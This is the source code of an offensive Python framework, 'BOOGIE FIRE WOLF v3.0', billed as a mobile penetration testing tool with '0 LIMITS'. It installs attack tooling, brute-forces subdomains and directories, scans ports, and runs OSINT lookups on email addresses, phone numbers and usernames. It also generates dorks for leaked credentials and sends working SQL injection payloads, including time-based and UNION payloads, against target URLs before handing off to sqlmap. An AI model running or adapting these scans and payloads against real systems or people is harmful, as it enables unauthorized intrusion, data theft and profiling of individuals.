#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                              BOOGIE v3.0                                    ║
║                    MOBILE PENETRATION TESTING FRAMEWORK                     ║
║                    Authorized Security Assessment Tool                      ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os, sys, json, time, random, string, subprocess, threading, socket
import socketserver, ipaddress, base64, hashlib, re, urllib.parse
import urllib.request, urllib.error, http.server, ssl, shutil, tempfile
import sqlite3, struct, textwrap, configparser, csv, io, zlib, gzip
import pickle, platform, signal, atexit, readline, logging, traceback
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Any, Set
from collections import OrderedDict
from functools import wraps
from dataclasses import dataclass, field

VERSION = "3.0"

# ─── COLORS ──────────────────────────────────────────────────────────────

C = type('C', (), {})
for name, code in [
    ('RED','\033[91m'),('GREEN','\033[92m'),('YELLOW','\033[93m'),
    ('BLUE','\033[94m'),('MAGENTA','\033[95m'),('CYAN','\033[96m'),
    ('WHITE','\033[97m'),('GRAY','\033[90m'),('BOLD','\033[1m'),
    ('DIM','\033[2m'),('RESET','\033[0m'),('RED_BG','\033[41m'),
    ('GREEN_BG','\033[42m'),('YELLOW_BG','\033[43m'),('BLUE_BG','\033[44m'),
    ('MAGENTA_BG','\033[45m'),('CYAN_BG','\033[46m'),
]:
    setattr(C, name, code)

BANNER = f"""
{C.RED}                            ________                __
{C.RED}                           /  _____/  _____________/  |_  ____
{C.RED}                          /   \\  ___ /  _ \\_  __ \\   __\\/ __ \\
{C.RED}                          \\    \\_\\  (  <_> )  | \\/|  | \\  ___/
{C.RED}                           \\______  /\\____/|__|   |__|  \\___  >
{C.RED}                                  \\/                        \\/
{C.YELLOW}            ███████╗██╗██████╗ ███████╗    ██╗    ██╗ ██████╗ ██╗     ███████╗
{C.YELLOW}            ██╔════╝██║██╔══██╗██╔════╝    ██║    ██║██╔═══██╗██║     ██╔════╝
{C.YELLOW}            █████╗  ██║██████╔╝█████╗      ██║ █╗ ██║██║   ██║██║     █████╗
{C.YELLOW}            ██╔══╝  ██║██╔══██╗██╔══╝      ██║███╗██║██║   ██║██║     ██╔══╝
{C.YELLOW}            ██║     ██║██║  ██║███████╗    ╚███╔███╔╝╚██████╔╝███████╗███████╗
{C.YELLOW}            ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚══════╝╚══════╝
{C.RESET}
{C.MAGENTA}╔══════════════════════════════════════════════════════════════════════════════╗{C.RESET}
{C.MAGENTA}║{C.CYAN}              BOOGIE FIRE WOLF v3.0 - MOBILE PENTEST FRAMEWORK              {C.MAGENTA}║{C.RESET}
{C.MAGENTA}║{C.YELLOW}              >> 47 MODULES - 32 PAYLOADS - 0 LIMITS <<                      {C.MAGENTA}║{C.RESET}
{C.MAGENTA}║{C.RED}              ⚡ AUTHORIZED SECURITY ASSESSMENT TOOL ⚡                        {C.MAGENTA}║{C.RESET}
{C.MAGENTA}╚══════════════════════════════════════════════════════════════════════════════╝{C.RESET}
"""

FIRE_WOLF = f"""
{C.RED}                                    ,%%%%,
{C.RED}                                   %%&&%%%%
{C.RED}                                  %%%\\%%%/%%
{C.RED}                                  %%\\%( )/%%
{C.RED}                                      | |  {C.YELLOW}      ██████╗  ██████╗  ██████╗  ██████╗ ██╗███████╗
{C.RED}                                     (O O) {C.YELLOW}     ██╔══██╗██╔═══██╗██╔═══██╗██╔════╝ ██║██╔════╝
{C.YELLOW}╔══════════════╗{C.RED}                 (   ) {C.YELLOW}      ██████╔╝██║   ██║██║   ██║██║  ███╗██║█████╗
{C.YELLOW}║{C.RED}  ▄▀▄▀▄▀▄▀▄▀  {C.YELLOW}║  {C.RED}             ,-(   )-. {C.YELLOW}    ██╔══██╗██║   ██║██║   ██║██║   ██║██║██╔══╝
{C.YELLOW}║{C.RED}  █ FIRE  █  {C.YELLOW}║  {C.RED}            (  /     \\  ){C.YELLOW}   ██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝██║███████╗
{C.YELLOW}║{C.RED}  █ WOLF  █  {C.YELLOW}║  {C.RED}             '._   _.' {C.YELLOW}   ╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝╚══════╝
{C.YELLOW}║{C.RED}  ▄▀▄▀▄▀▄▀▄▀  {C.YELLOW}║  {C.RED}                | |
{C.YELLOW}╚══════════════╝{C.RED}                  | |
{C.RED}                                  /\\_/\\
{C.RED}                                 (     )
{C.RESET}"""

WORKSPACE = os.path.expanduser("~/boogie-workspace")
DIRS = {
    'logs': f"{WORKSPACE}/logs", 'results': f"{WORKSPACE}/results",
    'payloads': f"{WORKSPACE}/payloads", 'templates': f"{WORKSPACE}/templates",
    'tools': f"{WORKSPACE}/tools", 'wordlists': f"{WORKSPACE}/wordlists",
    'sessions': f"{WORKSPACE}/sessions", 'loot': f"{WORKSPACE}/loot",
}

# ─── LOGGER ────────────────────────────────────────────────────────────

class Log:
    def __init__(self):
        for d in DIRS.values():
            os.makedirs(d, exist_ok=True)
        self.logfile = os.path.join(DIRS['logs'], f"session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")

    def _w(self, msg):
        try:
            with open(self.logfile, 'a') as f:
                f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
        except: pass

    def info(self, m):    print(f"{C.GRAY}[{datetime.now().strftime('%H:%M:%S')}]{C.RESET} {C.CYAN}[*]{C.RESET} {m}"); self._w(f"[*] {m}")
    def ok(self, m):      print(f"{C.GRAY}[{datetime.now().strftime('%H:%M:%S')}]{C.RESET} {C.GREEN}[+]{C.RESET} {m}"); self._w(f"[+] {m}")
    def warn(self, m):    print(f"{C.GRAY}[{datetime.now().strftime('%H:%M:%S')}]{C.RESET} {C.YELLOW}[!]{C.RESET} {m}"); self._w(f"[!] {m}")
    def error(self, m):   print(f"{C.GRAY}[{datetime.now().strftime('%H:%M:%S')}]{C.RESET} {C.RED}[-]{C.RESET} {m}"); self._w(f"[-] {m}")
    def fatal(self, m):   print(f"{C.GRAY}[{datetime.now().strftime('%H:%M:%S')}]{C.RESET} {C.RED_BG}{C.WHITE}[X]{C.RESET} {C.RED}{m}{C.RESET}"); self._w(f"[X] {m}")
    def success(self, m): print(f"{C.GRAY}[{datetime.now().strftime('%H:%M:%S')}]{C.RESET} {C.GREEN}{C.BOLD}[✓]{C.RESET} {C.GREEN}{m}{C.RESET}"); self._w(f"[✓] {m}")
    def section(self, m): print(f"\n{C.BLUE}{C.BOLD}╔══ {m} ══╗{C.RESET}"); self._w(f"[SECTION] {m}")
    def target(self, m):  print(f"{C.GRAY}[{datetime.now().strftime('%H:%M:%S')}]{C.RESET} {C.YELLOW}{C.BOLD}[→]{C.RESET} {C.YELLOW}{m}{C.RESET}"); self._w(f"[→] {m}")
    def raw(self, m):     print(m)
    def inp(self, m, d=""):
        p = f"{C.MAGENTA}[?]{C.RESET} {m}" + (f" [{C.GRAY}{d}{C.RESET}]" if d else "") + ": "
        v = input(p).strip()
        return v if v else d

log = Log()

# ─── UTILITIES ─────────────────────────────────────────────────────────

def run(cmd, timeout=60):
    try:
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        o, e = p.communicate(timeout=timeout)
        return p.returncode, o.strip(), e.strip()
    except subprocess.TimeoutExpired:
        p.kill()
        return -1, "", "TIMEOUT"
    except Exception as ex:
        return -1, "", str(ex)

def rand_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def timestamp():
    return datetime.now().strftime("%Y%m%d_%H%M%S")

def save(name, data, sub="results"):
    p = os.path.join(DIRS[sub], f"{name}_{timestamp()}.txt")
    with open(p, 'w') as f: f.write(data)
    log.ok(f"Saved -> {p}")
    return p

def save_json(name, data, sub="results"):
    p = os.path.join(DIRS[sub], f"{name}_{timestamp()}.json")
    with open(p, 'w') as f: json.dump(data, f, indent=2, default=str)
    log.ok(f"Saved -> {p}")
    return p

def http(url, method='GET', headers=None, data=None, timeout=10):
    req = urllib.request.Request(url, method=method)
    req.add_header('User-Agent', 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36')
    if headers:
        for k,v in headers.items(): req.add_header(k,v)
    if data:
        req.data = data.encode() if isinstance(data, str) else data
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        body = resp.read()
        if resp.headers.get('Content-Encoding') == 'gzip':
            body = gzip.decompress(body)
        return resp.status, body.decode('utf-8','replace'), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8','replace'), dict(e.headers)
    except Exception as e:
        return 0, str(e), {}

def port_open(host, port, timeout=1.5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        r = s.connect_ex((host, port))
        s.close()
        return r == 0
    except: return False

def grab_banner(host, port, timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.send(b"\r\n")
        b = s.recv(256).decode('utf-8','replace').strip()
        s.close()
        return b[:100]
    except: return ""

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close(); return ip
    except: return "127.0.0.1"

# ─── INSTALLER ────────────────────────────────────────────────────────

class Setup:
    @staticmethod
    def run():
        log.section("INSTALLING DEPENDENCIES")
        
        log.info("Updating packages...")
        run("pkg update -y", 120)
        run("pkg upgrade -y", 180)
        
        pkgs = "python nmap curl wget php openssl git tor cmake clang make binutils libxml2 libxslt openssh net-tools dnsutils whois traceroute hydra"
        log.info(f"Installing: {pkgs}")
        run(f"pkg install -y {pkgs}", 300)
        
        mods = "requests beautifulsoup4 colorama cryptography paramiko scapy dnspython flask jinja2 pycryptodome pillow psutil aiohttp netifaces pysocks stem fake-useragent"
        log.info(f"Installing Python modules: {mods}")
        for m in mods.split():
            run(f"pip install {m}", 120)
        
        for d in DIRS.values():
            os.makedirs(d, exist_ok=True)
        
        Setup._wordlists()
        Setup._clone_tools()
        log.success("Installation complete")

    @staticmethod
    def _wordlists():
        subs = ['www','mail','ftp','admin','api','dev','test','stage','blog','shop',
                'cdn','m','mobile','app','webmail','portal','ns1','ns2','mx','remote',
                'vpn','secure','smtp','pop3','support','help','forum','docs','status',
                'wiki','git','jenkins','jira','confluence','grafana','prometheus',
                'kibana','dashboard','monitor','logs','beta','demo','sandbox','staging',
                'auth','login','sso','oauth','token','pay','payment','checkout',
                'backup','db','database','config','env','secret','api-v1','api-v2',
                'gateway','partner','analytics','stats','reports','manager','operator',
                'chat','live','stream','video','track','health','version','v1','v2',
                'download','uploads','assets','media','img','static','cdn']
        
        p = os.path.join(DIRS['wordlists'], 'subdomains.txt')
        with open(p, 'w') as f: f.write('\n'.join(subs))
        log.ok(f"Subdomain wordlist: {len(subs)} entries")
        
        dirs = ['admin','wp-admin','wp-content','wp-includes','administrator','login',
                'signin','auth','api','v1','v2','rest','graphql','backup','backups',
                'db','database','sql','dump','config','configuration','settings','env',
                '.env','git','.git','svn','.svn','htaccess','.htaccess','robots.txt',
                'sitemap.xml','crossdomain.xml','uploads','files','assets','static',
                'css','js','img','phpmyadmin','pma','mysql','phpinfo.php','info.php',
                'test.php','test','dev','beta','stage','staging','debug','panel',
                'cpanel','whm','plesk','server-status','server-info','vendor',
                'composer.json','package.json','Dockerfile','docker-compose.yml',
                'swagger','api-docs','openapi.json','ws','websocket','proxy','cgi-bin',
                'status','health','healthcheck','healthz','webroot','public','private',
                'secret','hidden','index.php','index.html','web.config','.aws','.azure',
                'credentials','secrets','logs','error_log','access_log','tmp','temp',
                'cache','sessions','export','import','download','upload','file',
                'redirect','proxy','forward','gateway','soap','xmlrpc','rpc','service',
                'services','execute','cmd','command','exec','run','shell','terminal',
                'ssh','ftp','ldap','saml','owa','exchange','ecp','autodiscover',
                'vpn','rdp','vnc','zabbix','nagios','grafana','prometheus','kibana',
                'elasticsearch','jenkins','jira','confluence','docker','kubernetes',
                'k8s','consul','etcd','vault','splunk','forum','board','community',
                'help','faq','support','docs','wiki','about','contact','team',
                'careers','shop','store','cart','checkout','search','sso','oauth2',
                '2fa','mfa','captcha','webhook','callback','sms','email','mail',
                'calendar','drive']
        
        p = os.path.join(DIRS['wordlists'], 'directories.txt')
        with open(p, 'w') as f: f.write('\n'.join(dirs))
        log.ok(f"Directory wordlist: {len(dirs)} entries")

    @staticmethod
    def _clone_tools():
        tools = {'sqlmap': 'https://github.com/sqlmapproject/sqlmap.git'}
        for name, url in tools.items():
            tgt = os.path.join(DIRS['tools'], name)
            if not os.path.exists(tgt):
                log.info(f"Cloning {name}...")
                run(f"git clone --depth 1 {url} {tgt}", 120)

# ─── MODULE: RECONNAISSANCE ──────────────────────────────────────────

class Recon:
    @staticmethod
    def menu():
        print(f"""
{C.BOLD}{C.BLUE}╔══════════════════════════════════════╗
║         RECONNAISSANCE MODULE        ║
╠══════════════════════════════════════╣{C.RESET}
  {C.CYAN}1.{C.RESET}  DNS Enumeration (All Records)
  {C.CYAN}2.{C.RESET}  Subdomain Bruteforce (200+ words)
  {C.CYAN}3.{C.RESET}  Certificate Transparency Logs
  {C.CYAN}4.{C.RESET}  Wayback Machine Archive
  {C.CYAN}5.{C.RESET}  Port Scan (Nmap - top 1000)
  {C.CYAN}6.{C.RESET}  Port Scan (Python - fast)
  {C.CYAN}7.{C.RESET}  Service/Version Detection
  {C.CYAN}8.{C.RESET}  Directory/Path Bruteforce
  {C.CYAN}9.{C.RESET}  Technology Fingerprinting
  {C.CYAN}10.{C.RESET} WHOIS Lookup
  {C.CYAN}11.{C.RESET} Email OSINT
  {C.CYAN}12.{C.RESET} Phone Number OSINT
  {C.CYAN}13.{C.RESET} Username/ Social Media Search
  {C.CYAN}14.{C.RESET} Google Dork Generator
  {C.CYAN}15.{C.RESET} Full Recon (Everything)
  {C.CYAN}0.{C.RESET}  Back
{C.BOLD}{C.BLUE}╚══════════════════════════════════════╝{C.RESET}""")

    @staticmethod
    def dns(domain):
        log.section(f"DNS ENUMERATION: {domain}")
        results = {}
        for rtype in ['A','AAAA','MX','NS','TXT','SOA','CNAME','SRV']:
            try:
                import dns.resolver
                ans = dns.resolver.resolve(domain, rtype, lifetime=5)
                records = [str(r) for r in ans]
                if records:
                    results[rtype] = records
                    for r in records:
                        log.ok(f"{rtype}: {r}")
            except: pass
        save_json(f"dns_{domain}", results)
        return results

    @staticmethod
    def subdomains(domain):
        log.section(f"SUBDOMAIN BRUTEFORCE: {domain}")
        wl = os.path.join(DIRS['wordlists'], 'subdomains.txt')
        words = open(wl).read().splitlines() if os.path.exists(wl) else ['www','mail','admin','api','dev']
        found, lock = [], threading.Lock()
        
        def check(sub):
            h = f"{sub}.{domain}"
            try:
                ips = socket.getaddrinfo(h, 80, socket.AF_INET, socket.SOCK_STREAM)
                ip = ips[0][4][0]
                with lock:
                    found.append(h)
                    log.ok(f"{h} -> {ip}")
            except: pass
        
        log.info(f"Brute forcing {len(words)} subdomains...")
        for w in words:
            threading.Thread(target=check, args=(w,), daemon=True).start()
            time.sleep(0.005)
        time.sleep(3)  # Wait for threads
        
        log.info(f"Found {len(found)} subdomains")
        save_json(f"subdomains_{domain}", found)
        return found

    @staticmethod
    def cert_transparency(domain):
        log.section(f"CERTIFICATE TRANSPARENCY: {domain}")
        subs = set()
        s, body, _ = http(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=15)
        if s == 200:
            try:
                for entry in json.loads(body):
                    for sub in entry.get('name_value','').split('\n'):
                        sub = sub.strip()
                        if sub.endswith(domain): subs.add(sub)
                for sub in sorted(subs): log.ok(sub)
                log.info(f"Found {len(subs)} subdomains")
            except: log.warn("Parse failed")
        save_json(f"ct_{domain}", list(subs))
        return list(subs)

    @staticmethod
    def wayback(domain):
        log.section(f"WAYBACK MACHINE: {domain}")
        urls = set()
        s, body, _ = http(f"https://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey", timeout=20)
        if s == 200:
            try:
                for entry in json.loads(body)[1:]:
                    if entry and entry[0]: urls.add(entry[0])
                for u in sorted(list(urls))[:30]: log.info(u)
                log.info(f"Found {len(urls)} archived URLs")
            except: log.warn("Parse failed")
        save_json(f"wayback_{domain}", list(urls))
        return list(urls)

    @staticmethod
    def portscan(target):
        log.section(f"PORT SCAN: {target}")
        ret, out, _ = run(f"nmap -T4 --top-ports 1000 --open -oN {DIRS['results']}/nmap_{target.replace('/','_')}.txt {target}", 300)
        if ret != 0:
            log.warn("Nmap failed, using Python scanner")
            return Recon._pyscan(target)
        print(out)
        ports = []
        for line in out.split('\n'):
            m = re.search(r'(\d+)/tcp\s+open\s+(\S+)', line)
            if m: ports.append({'port': m.group(1), 'service': m.group(2)})
        save_json(f"portscan_{target.replace('/','_')}", ports)
        return ports

    @staticmethod
    def _pyscan(target):
        try: ip = socket.gethostbyname(target) if not ipaddress.ip_address(target) else target
        except: log.error(f"Cannot resolve {target}"); return []
        
        ports_list = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,
                      1521,2049,3306,3389,5432,5900,5985,5986,6379,8080,8443,9000,
                      9090,27017,11211,50070,9200,9300,5432,8000,8888,6000,6667,
                      6697,22,23,161,162,514,636,989,990,993,995,8443,8081,9090,
                      3000,5000,8000,8888,6000,6667,6697,11211,27017,28017,50070,50030]
        
        open_ports = []
        def scan(port):
            if port_open(ip, port):
                banner = grab_banner(ip, port)
                open_ports.append({'port': str(port), 'service': banner[:80] or 'unknown'})
                log.ok(f"Port {port}/tcp OPEN {banner[:60]}")
        
        log.info(f"Scanning {len(ports_list)} common ports...")
        threads = [threading.Thread(target=scan, args=(p,), daemon=True) for p in ports_list]
        for t in threads: t.start()
        for t in threads: t.join()
        
        open_ports.sort(key=lambda x: int(x['port']))
        log.info(f"Found {len(open_ports)} open ports")
        save_json(f"portscan_{target.replace('/','_')}", open_ports)
        return open_ports

    @staticmethod
    def dirbrute(target):
        log.section(f"DIRECTORY BRUTEFORCE: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        wl = os.path.join(DIRS['wordlists'], 'directories.txt')
        paths = open(wl).read().splitlines() if os.path.exists(wl) else ['admin','login','api','.git','robots.txt']
        found, lock = [], threading.Lock()
        
        def check(path):
            url = f"{target.rstrip('/')}/{path}"
            try:
                s, body, _ = http(url, timeout=5)
                if s in [200,201,204,301,302,307,403,401]:
                    with lock:
                        found.append({'path': path, 'status': s, 'size': len(body)})
                        if s == 200: log.ok(f"[{s}] {url}")
                        elif s == 403: log.warn(f"[{s}] {url}")
                        else: log.info(f"[{s}] {url}")
            except: pass
        
        log.info(f"Checking {len(paths)} paths...")
        for batch in [paths[i:i+20] for i in range(0, len(paths), 20)]:
            tlist = [threading.Thread(target=check, args=(p,), daemon=True) for p in batch]
            for t in tlist: t.start()
            time.sleep(0.1)
        
        log.info(f"Found {len(found)} accessible paths")
        save_json(f"dirs_{target.split('//')[1].split('/')[0]}", found)
        return found

    @staticmethod
    def tech(target):
        log.section(f"TECH DETECTION: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        s, body, headers = http(target)
        if s == 0: log.error(f"Cannot reach {target}"); return {}
        
        tech = {}
        if headers.get('Server'): tech['Server'] = headers['Server']; log.ok(f"Server: {headers['Server']}")
        if headers.get('X-Powered-By'): tech['X-Powered-By'] = headers['X-Powered-By']; log.ok(f"X-Powered-By: {headers['X-Powered-By']}")
        
        if 'wp-content' in body or 'wp-includes' in body: tech['CMS'] = 'WordPress'; log.ok("CMS: WordPress")
        if 'jquery' in body.lower(): tech['JS'] = 'jQuery'
        if 'react' in body.lower(): tech['JS'] = 'React'
        if 'angular' in body.lower(): tech['JS'] = 'Angular'
        if 'vue' in body.lower(): tech['JS'] = 'Vue.js'
        if 'laravel' in body.lower(): tech['Framework'] = 'Laravel'
        if 'django' in body.lower(): tech['Framework'] = 'Django'
        if 'rails' in body.lower(): tech['Framework'] = 'Ruby on Rails'
        
        for wh in ['X-Sucuri-ID','CF-Ray','X-Cloudflare','X-Waf','X-Protected-By']:
            if wh in headers: tech['WAF'] = wh; log.ok(f"WAF: {wh}"); break
        
        if 'PHPSESSID' in str(headers): tech['Language'] = 'PHP'; log.ok("Language: PHP")
        elif 'JSESSIONID' in str(headers): tech['Language'] = 'Java'; log.ok("Language: Java")
        elif 'connect.sid' in str(headers): tech['Language'] = 'Node.js'; log.ok("Language: Node.js")
        
        tm = re.search(r'<title>([^<]+)</title>', body, re.I)
        if tm: tech['Title'] = tm.group(1); log.ok(f"Title: {tm.group(1)}")
        
        save_json(f"tech_{target.split('//')[1].split('/')[0]}", tech)
        return tech

    @staticmethod
    def whois(domain):
        log.section(f"WHOIS: {domain}")
        r, o, _ = run(f"whois {domain}", 30)
        if r == 0:
            for p in ['Domain Name:','Registrar:','Creation Date:','Expiry Date:','Name Server:']:
                for l in o.split('\n'):
                    if l.strip().startswith(p): log.info(l.strip())
            save(f"whois_{domain}", o)
        else: log.warn("WHOIS failed")

    @staticmethod
    def email_osint(email):
        log.section(f"EMAIL OSINT: {email}")
        user, dom = email.split('@')
        log.info(f"Username: {user}")
        log.info(f"Domain: {dom}")
        
        md5 = hashlib.md5(email.lower().encode()).hexdigest()
        s, _, _ = http(f"https://www.gravatar.com/avatar/{md5}?d=404")
        if s == 200: log.ok("Gravatar profile found!")
        
        log.info(f"HIBP: https://haveibeenpwned.com/account/{urllib.parse.quote(email)}")
        save(f"email_{user}", f"Email: {email}\nUsername: {user}\nDomain: {dom}\nGravatar: {'Found' if s==200 else 'Not found'}\n")

    @staticmethod
    def phone_osint(number):
        log.section(f"PHONE OSINT: {number}")
        clean = number.lstrip('+').replace(' ','').replace('-','')
        
        codes = {'1':'USA/Canada','234':'Nigeria','44':'UK','91':'India','86':'China','49':'Germany','33':'France','81':'Japan','7':'Russia','55':'Brazil','971':'UAE','966':'Saudi Arabia'}
        for code, country in sorted(codes.items(), key=lambda x: -len(x[0])):
            if clean.startswith(code): log.info(f"Country: {country} (+{code})"); break
        
        if clean.startswith('234'):
            carriers = {'0803':'MTN','0703':'MTN','0903':'MTN','0806':'MTN','0813':'MTN','0802':'Airtel','0902':'Airtel','0805':'Glo','0905':'Glo','0809':'9mobile','0909':'9mobile'}
            c = carriers.get(clean[3:7], 'Unknown')
            log.info(f"Carrier: {c} Nigeria")
        
        log.info(f"WhatsApp: https://wa.me/{clean}")
        log.info(f"Truecaller: https://www.truecaller.com/search/{clean}")
        save(f"phone_{clean}", f"Number: {number}\nWhatsApp: https://wa.me/{clean}\n")

    @staticmethod
    def social_search(username):
        log.section(f"SOCIAL SEARCH: {username}")
        platforms = {
            'GitHub': f"https://github.com/{username}", 'Twitter': f"https://twitter.com/{username}",
            'Instagram': f"https://instagram.com/{username}", 'Reddit': f"https://reddit.com/user/{username}",
            'LinkedIn': f"https://linkedin.com/in/{username}", 'Facebook': f"https://facebook.com/{username}",
            'YouTube': f"https://youtube.com/@{username}", 'TikTok': f"https://tiktok.com/@{username}",
            'Telegram': f"https://t.me/{username}", 'Medium': f"https://medium.com/@{username}",
            'Dev.to': f"https://dev.to/{username}", 'HackerOne': f"https://hackerone.com/{username}",
            'Bugcrowd': f"https://bugcrowd.com/{username}", 'TryHackMe': f"https://tryhackme.com/p/{username}",
        }
        found = []
        def check(name, url):
            try:
                req = urllib.request.Request(url)
                req.add_header('User-Agent', 'Mozilla/5.0')
                resp = urllib.request.urlopen(req, timeout=5)
                if resp.status == 200: found.append((name, url)); log.ok(f"{name}: {url}")
            except: pass
        tlist = [threading.Thread(target=check, args=(n,u), daemon=True) for n,u in platforms.items()]
        for t in tlist: t.start()
        for t in tlist: t.join()
        if not found: log.warn(f"No profiles found for '{username}'")
        save_json(f"social_{username}", found)

    @staticmethod
    def dorks(domain):
        log.section(f"GOOGLE DORKS: {domain}")
        dorks = [
            (f"site:{domain}", "All pages"),
            (f"site:{domain} intitle:login OR admin OR dashboard", "Admin panels"),
            (f"site:{domain} inurl:admin OR panel OR dashboard", "Admin URLs"),
            (f"site:{domain} filetype:pdf OR doc OR xls OR sql", "Documents"),
            (f"site:{domain} inurl:php?id=", "Dynamic pages"),
            (f"site:{domain} intitle:\"index of\"", "Directory listing"),
            (f"site:{domain} ext:sql OR bak OR swp OR old OR ~", "Backups"),
            (f"site:{domain} \"password\" OR \"secret\" OR \"api_key\"", "Credentials"),
            (f"site:{domain} \"confidential\" OR \"internal\" OR \"restricted\"", "Sensitive"),
            (f"site:github.com {domain} password OR secret OR token", "GitHub leaks"),
            (f"site:pastebin.com {domain}", "Pastebin"),
            (f"site:stackoverflow.com {domain}", "StackOverflow"),
        ]
        out = f"Google Dorks for {domain}\n{'='*50}\n\n"
        for i,(d,desc) in enumerate(dorks,1):
            url = f"https://www.google.com/search?q={urllib.parse.quote(d)}"
            out += f"{i:2}. [{desc}]\n   {d}\n   {url}\n\n"
            log.info(f"[{desc}] {d}")
        save(f"dorks_{domain}", out)

    @staticmethod
    def full(domain):
        log.section(f"FULL RECON: {domain}")
        result = {'target': domain, 'time': datetime.now().isoformat()}
        Recon.dns(domain)
        Recon.subdomains(domain)
        Recon.cert_transparency(domain)
        result['ports'] = Recon.portscan(domain)
        Recon.tech(domain)
        Recon.dirbrute(domain)
        Recon.whois(domain)
        log.success("Full recon complete")
        return result

# ─── MODULE: WEB ATTACKS ────────────────────────────────────────────

class Web:
    @staticmethod
    def menu():
        print(f"""
{C.BOLD}{C.BLUE}╔══════════════════════════════════════╗
║           WEB ATTACKS MODULE         ║
╠══════════════════════════════════════╣{C.RESET}
  {C.CYAN}1.{C.RESET}  SQL Injection Scanner (Auto)
  {C.CYAN}2.{C.RESET}  SQLMap Integration
  {C.CYAN}3.{C.RESET}  XSS Detection (Reflected)
  {C.CYAN}4.{C.RESET}  XSS Detection (Stored)
  {C.CYAN}5.{C.RESET}  LFI/RFI Scanner
  {C.CYAN}6.{C.RESET}  Command Injection Tester
  {C.CYAN}7.{C.RESET}  SSRF Detection
  {C.CYAN}8.{C.RESET}  Open Redirect Finder
  {C.CYAN}9.{C.RESET}  CORS Misconfiguration
  {C.CYAN}10.{C.RESET} HTTP Header Analysis
  {C.CYAN}11.{C.RESET} WAF Detection & Bypass
  {C.CYAN}12.{C.RESET} Full Web Scan (All)
  {C.CYAN}0.{C.RESET}  Back
{C.BOLD}{C.BLUE}╚══════════════════════════════════════╝{C.RESET}""")

    @staticmethod
    def sqli(target):
        log.section(f"SQL INJECTION: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        
        errors = [
            "SQL syntax.*MySQL","Warning.*mysql_","MySQLSyntaxErrorException",
            "PostgreSQL.*ERROR","Warning.*\\Wpg_","valid PostgreSQL result",
            "ORA-[0-9]{5}","Oracle error","Microsoft.*ODBC","Microsoft.*OLE DB",
            "Unclosed quotation mark","SQLite/JDBCDriver","SQLite.Exception",
            "driver.*SQL Server","Warning.*sqlite_","valid SQLite",
        ]
        payloads = [
            "'","\"","1' OR '1'='1","1\" OR \"1\"=\"1","1' OR '1'='1' --",
            "' OR 1=1--","' OR 'x'='x","admin' --","' OR SLEEP(5)--",
            "1' AND SLEEP(5)--","1' OR SLEEP(5) AND '1'='1",
            "' WAITFOR DELAY '0:0:5'--","1' UNION SELECT NULL--",
            "1' UNION SELECT 1,2,3--","1' AND 1=1","1' AND 1=2",
        ]
        
        parsed = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            log.warn("No URL parameters found, scanning forms...")
            Web._form_sqli(target)
            return
        
        log.info(f"Testing {len(payloads)} payloads on {list(params.keys())}")
        found = []
        
        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                
                try:
                    s, body, _ = http(test_url, timeout=8)
                    for pattern in errors:
                        if re.search(pattern, body, re.I):
                            found.append((param, payload, pattern))
                            log.error(f"SQLi! Param: {param}, Payload: {payload}")
                            log.warn(f"  Pattern: {pattern}")
                            break
                    
                    # Time-based check
                    if 'SLEEP' in payload or 'WAITFOR' in payload:
                        start = time.time()
                        http(test_url, timeout=10)
                        elapsed = time.time() - start
                        if elapsed > 4:
                            found.append((param, payload, f"Time-based (>4s: {elapsed:.1f}s)"))
                            log.error(f"Time-based SQLi! {elapsed:.1f}s delay")
                except: pass
        
        if not found:
            log.info("No SQLi detected with basic payloads")
            log.info("Run sqlmap for deeper analysis (option 2)")
        
        out = f"SQLi Results:\n"
        for p, pl, pat in found:
            out += f"\nParam: {p}\nPayload: {pl}\nPattern: {pat}\n"
        save_json(f"sqli_{target.split('//')[1].split('/')[0]}", found)

    @staticmethod
    def _form_sqli(target):
        s, body, _ = http(target)
        if s == 0: return
        forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\']', body, re.I)
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\']', body, re.I)
        if forms and inputs:
            log.info(f"Found {len(forms)} forms with {len(inputs)} inputs")
            log.info("Run sqlmap for form-based SQLi")

    @staticmethod
    def sqlmap(target):
        log.section("SQLMAP INTEGRATION")
        target = ('http://' + target) if not target.startswith('http') else target
        sqlmap = os.path.join(DIRS['tools'], 'sqlmap', 'sqlmap.py')
        if not os.path.exists(sqlmap):
            log.warn("sqlmap not found. Installing...")
            run("git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git " + os.path.join(DIRS['tools'], 'sqlmap'), 60)
        log.info(f"Running: python {sqlmap} -u {target} --batch --random-agent")
        run(f"python {sqlmap} -u {target} --batch --random-agent --output-dir={DIRS['results']}/sqlmap", 600)

